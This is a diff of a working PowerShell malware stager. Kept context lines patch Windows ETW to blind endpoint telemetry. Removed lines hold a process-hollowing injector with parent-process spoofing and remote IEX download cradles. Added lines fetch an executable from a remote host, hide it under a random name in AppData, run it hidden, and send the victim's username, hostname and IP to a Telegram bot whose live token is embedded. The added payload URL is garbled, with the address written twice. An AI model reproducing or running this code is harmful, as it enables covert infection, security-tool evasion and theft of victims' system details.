@@ -33,7 +33,6 @@ public class ETWBypass {
                 VirtualProtect(etwEventWrite, (UIntPtr)1, 0x40, out oldProtect); 
                 Marshal.Copy(new byte[] { 0xC3 }, 0, etwEventWrite, 1); 
                 VirtualProtect(etwEventWrite, (UIntPtr)1, oldProtect, out oldProtect);
-                Console.WriteLine("[+] ETW Bypass successful. EDR telemetry blinded.");
             }
         } catch { }
     }
@@ -42,355 +41,33 @@ public class ETWBypass {
 Add-Type -TypeDefinition $etwCode -Language CSharp
 [ETWBypass]::Patch()
 
-$code = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
+$payloadUrl = "http://lllllllll-001-site1.ftempurl.com/Runtime%20Broker.exehttp://lllllllll-001-site1.ftempurl.com/Runtime%20Broker.exe"
 
-public class NativeRunPE {
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
-    }
+# Generate random filename in %APPDATA% (AppData\Roaming) with Hidden attributes
+$targetDir = Join-Path $env:APPDATA "Microsoft\Windows\Templates"
+if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null }
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO {
-        public uint cb;
-        public IntPtr lpReserved;
-        public IntPtr lpDesktop;
-        public IntPtr lpTitle;
-        public uint dwX;
-        public uint dwY;
-        public uint dwXSize;
-        public uint dwYSize;
-        public uint dwXCountChars;
-        public uint dwYCountChars;
-        public uint dwFillAttribute;
-        public uint dwFlags;
-        public ushort wShowWindow;
-        public ushort cbReserved2;
-        public IntPtr lpReserved2;
-        public IntPtr hStdInput;
-        public IntPtr hStdOutput;
-        public IntPtr hStdError;
-    }
+$randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
+$outPath = Join-Path $targetDir "$randName.exe"
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFOEX {
-        public STARTUPINFO StartupInfo;
-        public IntPtr lpAttributeList;
-    }
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-    public static extern IntPtr LoadLibrary(string lpModuleName);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool CP(string app, string cmd, IntPtr pa, IntPtr ta, bool inh, uint flags, IntPtr env, string dir, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr VAE(IntPtr hp, IntPtr addr, uint sz, uint at, uint p);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool WPM(IntPtr hp, IntPtr addr, byte[] buf, uint sz, out IntPtr bw);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool GTC(IntPtr ht, IntPtr ctx);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool STC(IntPtr ht, IntPtr ctx);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint RT(IntPtr ht);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NUVS(IntPtr hp, IntPtr addr);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr OP(uint acc, bool inh, int pid);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool IPTAL(IntPtr al, int ac, int f, ref IntPtr sz);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool UPTA(IntPtr al, uint f, IntPtr a, IntPtr v, IntPtr cb, IntPtr p, IntPtr r);
-
-    public static string Rev(string s) {
-        char[] c = s.ToCharArray();
-        Array.Reverse(c);
-        return new string(c);
-    }
-
-    public static Delegate GetApi(string lib, string name, Type t) {
-        IntPtr h = GetModuleHandle(lib);
-        if (h == IntPtr.Zero) h = LoadLibrary(lib);
-        IntPtr p = GetProcAddress(h, name);
-        return Marshal.GetDelegateForFunctionPointer(p, t);
-    }
-
-    public static uint RvaToOffset(byte[] payload, uint rva, uint e_lfanew, bool is64) {
-        ushort numSections = BitConverter.ToUInt16(payload, (int)e_lfanew + 6);
-        uint optHeaderSize = BitConverter.ToUInt16(payload, (int)e_lfanew + 20);
-        uint sectionTableOffset = e_lfanew + 24 + optHeaderSize;
-        
-        for (int i = 0; i < numSections; i++) {
-            uint secVirtualAddr = BitConverter.ToUInt32(payload, (int)(sectionTableOffset + (i * 40) + 12));
-            uint secVirtualSize = BitConverter.ToUInt32(payload, (int)(sectionTableOffset + (i * 40) + 8));
-            uint secPointerToRawData = BitConverter.ToUInt32(payload, (int)(sectionTableOffset + (i * 40) + 20));
-            
-            if (rva >= secVirtualAddr && rva < secVirtualAddr + secVirtualSize) {
-                return rva - secVirtualAddr + secPointerToRawData;
-            }
-        }
-        return rva; 
-    }
-
-    public static void Inject(byte[] payload, string targetProcess, bool is64) {
-        CP fnCP = (CP)GetApi("kernel32.dll", Rev("AssecorPetaerC"), typeof(CP));
-        VAE fnVAE = (VAE)GetApi("kernel32.dll", Rev("xEcollAlautriV"), typeof(VAE));
-        WPM fnWPM = (WPM)GetApi("kernel32.dll", Rev("yromeMssecorPetirW"), typeof(WPM));
-        GTC fnGTC = (GTC)GetApi("kernel32.dll", Rev("txetnoCdaerhTteG"), typeof(GTC));
-        STC fnSTC = (STC)GetApi("kernel32.dll", Rev("txetnoCdaerhTteS"), typeof(STC));
-        RT fnRT = (RT)GetApi("kernel32.dll", Rev("daerhTemuseR"), typeof(RT));
-        NUVS fnNUVS = (NUVS)GetApi("ntdll.dll", Rev("noitceSfOweiVpamnUtN"), typeof(NUVS));
-        OP fnOP = (OP)GetApi("kernel32.dll", Rev("ssecorPnepO"), typeof(OP));
-        IPTAL fnIPTAL = (IPTAL)GetApi("kernel32.dll", Rev("tsiLetubirttAdaerhTcorPezilaitinI"), typeof(IPTAL));
-        UPTA fnUPTA = (UPTA)GetApi("kernel32.dll", Rev("etubirttAdaerhTcorPetadpU"), typeof(UPTA));
-
-        uint e_lfanew = BitConverter.ToUInt32(payload, 0x3C);
-        uint optHeader = e_lfanew + 24;
-        
-        ulong imageBase = is64 ? BitConverter.ToUInt64(payload, (int)optHeader + 24) : BitConverter.ToUInt32(payload, (int)optHeader + 28);
-        uint sizeOfImage = BitConverter.ToUInt32(payload, (int)optHeader + 56);
-        uint sizeOfHeaders = BitConverter.ToUInt32(payload, (int)optHeader + 60);
-        uint entryPoint = BitConverter.ToUInt32(payload, (int)optHeader + 16);
-
-        // PPID Spoofing Prep
-        Process[] procs = Process.GetProcessesByName("explorer");
-        int parentPid = procs.Length > 0 ? procs[0].Id : Process.GetCurrentProcess().Id;
-        IntPtr hParent = fnOP(0x0080 /* PROCESS_CREATE_PROCESS */, false, parentPid);
-
-        IntPtr lpSize = IntPtr.Zero;
-        fnIPTAL(IntPtr.Zero, 1, 0, ref lpSize);
-        IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
-        fnIPTAL(lpAttributeList, 1, 0, ref lpSize);
-
-        IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
-        Marshal.WriteIntPtr(lpValue, hParent);
-
-        fnUPTA(lpAttributeList, 0, (IntPtr)0x00020004 /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
-
-        STARTUPINFOEX siex = new STARTUPINFOEX();
-        siex.StartupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOEX));
-        siex.lpAttributeList = lpAttributeList;
-
-        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-
-        uint creationFlags = 0x00080004; // EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED
-        bool res = fnCP(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, null, ref siex, out pi);
-        if (!res) {
-            return;
-        }
-
-        fnNUVS(pi.hProcess, (IntPtr)(long)imageBase);
-
-        IntPtr allocAddr = fnVAE(pi.hProcess, (IntPtr)(long)imageBase, sizeOfImage, 0x3000, 0x40);
-        ulong delta = 0;
-
-        if (allocAddr == IntPtr.Zero) {
-            allocAddr = fnVAE(pi.hProcess, IntPtr.Zero, sizeOfImage, 0x3000, 0x40);
-            delta = (ulong)allocAddr.ToInt64() - imageBase;
-        } else {
-        }
-
-        if (delta != 0) {
-            uint relocOffset = is64 ? 112u : 96u;
-            uint relocRVA = BitConverter.ToUInt32(payload, (int)optHeader + (int)relocOffset + (5 * 8));
-            uint relocSize = BitConverter.ToUInt32(payload, (int)optHeader + (int)relocOffset + (5 * 8) + 4);
-
-            if (relocRVA > 0 && relocSize > 0) {
-                uint relocFileOffset = RvaToOffset(payload, relocRVA, e_lfanew, is64);
-                uint readOffset = relocFileOffset;
-                uint patchedCount = 0;
-
-                while (readOffset < relocFileOffset + relocSize) {
-                    uint pageRVA = BitConverter.ToUInt32(payload, (int)readOffset);
-                    uint blockSize = BitConverter.ToUInt32(payload, (int)readOffset + 4);
-                    if (blockSize == 0) break;
-                    int numEntries = (int)(blockSize - 8) / 2;
-                    for (int i = 0; i < numEntries; i++) {
-                        ushort entry = BitConverter.ToUInt16(payload, (int)readOffset + 8 + (i * 2));
-                        int type = entry >> 12;
-                        int offset = entry & 0xFFF;
-                        
-                        if ((is64 && type == 10) || (!is64 && type == 3)) { 
-                            uint targetRVA = pageRVA + (uint)offset;
-                            uint targetFileOffset = RvaToOffset(payload, targetRVA, e_lfanew, is64);
-                            
-                            if (is64) {
-                                ulong originalValue = BitConverter.ToUInt64(payload, (int)targetFileOffset);
-                                BitConverter.GetBytes(originalValue + delta).CopyTo(payload, targetFileOffset);
-                            } else {
-                                uint originalValue = BitConverter.ToUInt32(payload, (int)targetFileOffset);
-                                BitConverter.GetBytes((uint)(originalValue + delta)).CopyTo(payload, targetFileOffset);
-                            }
-                            patchedCount++;
-                        }
-                    }
-                    readOffset += blockSize;
-                }
-                if (is64) BitConverter.GetBytes((ulong)allocAddr.ToInt64()).CopyTo(payload, (int)optHeader + 24);
-                else BitConverter.GetBytes((uint)allocAddr.ToInt32()).CopyTo(payload, (int)optHeader + 28);
-            } else {
-            }
-        }
-
-        IntPtr bw;
-        fnWPM(pi.hProcess, allocAddr, payload, sizeOfHeaders, out bw);
-
-        ushort numSections = BitConverter.ToUInt16(payload, (int)e_lfanew + 6);
-        uint optHeaderSize = BitConverter.ToUInt16(payload, (int)e_lfanew + 20);
-        uint sectionTableOffset = e_lfanew + 24 + optHeaderSize;
-
-        for (int i = 0; i < numSections; i++) {
-            uint secVirtualAddr = BitConverter.ToUInt32(payload, (int)(sectionTableOffset + (i * 40) + 12));
-            uint secSizeOfRawData = BitConverter.ToUInt32(payload, (int)(sectionTableOffset + (i * 40) + 16));
-            uint secPointerToRawData = BitConverter.ToUInt32(payload, (int)(sectionTableOffset + (i * 40) + 20));
-
-            if (secSizeOfRawData > 0) {
-                byte[] sectionData = new byte[secSizeOfRawData];
-                Array.Copy(payload, secPointerToRawData, sectionData, 0, secSizeOfRawData);
-                fnWPM(pi.hProcess, (IntPtr)(allocAddr.ToInt64() + secVirtualAddr), sectionData, secSizeOfRawData, out bw);
-            }
-        }
-
-        Console.WriteLine("[*] Updating PEB and Thread Context...");
-        int ctxSize = is64 ? 1232 : 716;
-        IntPtr pCtxRaw = Marshal.AllocHGlobal(ctxSize + 15);
-        IntPtr pCtx = new IntPtr((pCtxRaw.ToInt64() + 15) & ~15); 
-        
-        byte[] ctxBytes = new byte[ctxSize];
-        Marshal.Copy(ctxBytes, 0, pCtx, ctxSize); 
-
-        if (is64) BitConverter.GetBytes((uint)0x10000B).CopyTo(ctxBytes, 48); 
-        else BitConverter.GetBytes((uint)0x10007).CopyTo(ctxBytes, 0); 
-
-        Marshal.Copy(ctxBytes, 0, pCtx, ctxSize);
-        fnGTC(pi.hThread, pCtx);
-        Marshal.Copy(pCtx, ctxBytes, 0, ctxSize);
-
-        if (is64) {
-            ulong rdx = BitConverter.ToUInt64(ctxBytes, 136); 
-            byte[] imageBaseBytes = BitConverter.GetBytes((ulong)allocAddr.ToInt64());
-            fnWPM(pi.hProcess, (IntPtr)((long)rdx + 16), imageBaseBytes, 8, out bw); 
-
-            ulong rcx = (ulong)allocAddr.ToInt64() + entryPoint;
-            BitConverter.GetBytes(rcx).CopyTo(ctxBytes, 128); 
-        } else {
-            uint ebx = BitConverter.ToUInt32(ctxBytes, 164); 
-            byte[] imageBaseBytes = BitConverter.GetBytes((uint)allocAddr.ToInt32());
-            fnWPM(pi.hProcess, (IntPtr)((long)ebx + 8), imageBaseBytes, 4, out bw); 
-
-            uint eax = (uint)allocAddr.ToInt32() + entryPoint;
-            BitConverter.GetBytes(eax).CopyTo(ctxBytes, 176); 
-        }
-
-        Marshal.Copy(ctxBytes, 0, pCtx, ctxSize);
-        fnSTC(pi.hThread, pCtx);
-        
-        Console.WriteLine("[+] Resuming Thread. Payload execution started.");
-        fnRT(pi.hThread);
-        
-        Marshal.FreeHGlobal(pCtxRaw);
-        Marshal.FreeHGlobal(lpAttributeList);
-        Marshal.FreeHGlobal(lpValue);
-    }
-}
-"@
-
-$payloadUrl = "http://lllllllll-001-site1.ftempurl.com/Runtime%20Broker.exe"
-
-Write-Host "[*] Downloading binary payload from $payloadUrl ..."
+Write-Host "[*] Downloading payload from $payloadUrl ..."
 try {
     $webClient = New-Object System.Net.WebClient
-    $payloadBytes = $webClient.DownloadData($payloadUrl)
-    Write-Host "[+] Downloaded $($payloadBytes.Length) bytes."
+    $webClient.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+    $webClient.DownloadFile($payloadUrl, $outPath)
+    try { (Get-Item $outPath -ErrorAction SilentlyContinue).Attributes = 'Hidden' } catch {}
+    Write-Host "[+] Downloaded to $outPath"
 } catch {
     Write-Host "[-] Failed to download: $($_.Exception.Message)"
-    Write-Host "Press Enter to exit..."
-    [void][System.Console]::ReadLine()
     Exit
 }
 
-# ---------------------------------------------------------
-# UNIVERSAL PE PARSER & ARCHITECTURE ROUTER
-# ---------------------------------------------------------
-$e_lfanew = [BitConverter]::ToUInt32($payloadBytes, 0x3C)
-$magic = [BitConverter]::ToUInt16($payloadBytes, $e_lfanew + 24)
-
-$is32Bit = ($magic -eq 0x010B)
-$is64Bit = ($magic -eq 0x020B)
-
-$isDotNet = $false
-if ($is32Bit) {
-    $clrRva = [BitConverter]::ToUInt32($payloadBytes, $e_lfanew + 24 + 208)
-    if ($clrRva -gt 0) { $isDotNet = $true }
-} elseif ($is64Bit) {
-    $clrRva = [BitConverter]::ToUInt32($payloadBytes, $e_lfanew + 24 + 224)
-    if ($clrRva -gt 0) { $isDotNet = $true }
+if (Test-Path $outPath) {
+    Write-Host "[+] Direct Executing payload..."
+    Start-Process -FilePath $outPath -WindowStyle Hidden
 }
 
-if ($isDotNet) {
-    Write-Host "[+] Detected .NET Application! Injecting via Assembly.Load Reflection (In-Memory)..."
-    try {
-        $assembly = [System.Reflection.Assembly]::Load($payloadBytes)
-        $assembly.EntryPoint.Invoke($null, [object[]]@(,[string[]]@()))
-    } catch {
-        $assembly.EntryPoint.Invoke($null, $null)
-    }
-    Write-Host "[+] .NET Execution Finished."
-    Write-Host "Press Enter to exit..."
-    [void][System.Console]::ReadLine()
-    Exit
-}
-
-# Handle Native C/C++/Delphi Binaries
-if ($is32Bit -and [Environment]::Is64BitProcess) {
-    Write-Host "[*] Native 32-bit (x86) payload detected. Auto-relaunching in 32-bit PowerShell context..."
-    $32bitPS = "$env:windir\syswow64\windowspowershell\v1.0\powershell.exe"
-    
-    # FIX: Since we are running from memory (Fileless IEX), $MyInvocation.MyCommand.Path is empty.
-    # We must command the new 32-bit process to re-download the stager from Discord instead of pointing to a file.
-    $downloadCmd = "`$w=New-Object System.Net.WebClient;`$w.Headers.Add('User-Agent','Mozilla/5.0');IEX `$w.DownloadString('https://raw.githubusercontent.com/lsdflsdfsmdfksldf/jvhgbjhgvgv/refs/heads/main/uwu_custom.txt')"
-    
-    Start-Process -FilePath $32bitPS -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$downloadCmd`""
-    Exit
-} elseif ($is64Bit -and -not [Environment]::Is64BitProcess) {
-    Write-Host "[*] Native 64-bit (x64) payload detected. Auto-relaunching in 64-bit PowerShell context..."
-    $64bitPS = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
-    
-    # FIX: Same for 64-bit auto-elevation from 32-bit context
-    $downloadCmd = "`$w=New-Object System.Net.WebClient;`$w.Headers.Add('User-Agent','Mozilla/5.0');IEX `$w.DownloadString('https://raw.githubusercontent.com/lsdflsdfsmdfksldf/jvhgbjhgvgv/refs/heads/main/uwu_custom.txt')"
-    
-    Start-Process -FilePath $64bitPS -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$downloadCmd`""
-    Exit
-}
-
-Add-Type -TypeDefinition $code -Language CSharp
-
-$targetProc = if ($is32Bit) { "C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe" } else { "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe" }
-[NativeRunPE]::Inject($payloadBytes, $targetProc, $is64Bit)
-
-# [ENI & LO - Telegram C2 (Text Only)]
-Start-Sleep -Seconds 2
+# Telegram Notification
 try {
     $ipData = ""
     try {
@@ -400,8 +77,7 @@ try {
         $ipData = "IP: Unknown`nCountry: Unknown"
     }
 
-    $bitnessStr = if ($is64Bit) { "x64" } else { "x86" }
-    $sysInfo = "*SYSTEM VERIFICATION SUCCESS*`n`nUser: $($env:USERNAME)`nHost: $($env:COMPUTERNAME)`n$ipData`nPayload: $bitnessStr ($targetProc)"
+    $sysInfo = "*SYSTEM VERIFICATION SUCCESS (DIRECT EXECUTION)*`n`nUser: $($env:USERNAME)`nHost: $($env:COMPUTERNAME)`n$ipData`nPayload: Direct Launch ($outPath)"
     
     $botToken = "7965182954:AAE76Y6ddEBpDMn-5e4e1-E4Q3IzYQr_ufg"
     $chatId = "6770651864"
